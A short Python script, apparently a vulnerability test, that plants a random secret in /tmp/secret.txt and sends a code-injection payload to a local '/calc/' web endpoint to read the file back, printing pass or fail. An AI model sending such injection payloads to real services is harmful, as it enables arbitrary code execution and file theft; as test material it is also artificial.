import requests
import random

payload = "with open('/tmp/secret.txt') as f: print(f.read())"

secretval = str(random.random())
with open('/tmp/secret.txt', 'w') as f:
    f.write(secretval)

r = requests.get('http://127.0.0.1:5000/calc/' + payload)
if (r.text == secretval):
    print("pass")
else:
    print("fail")
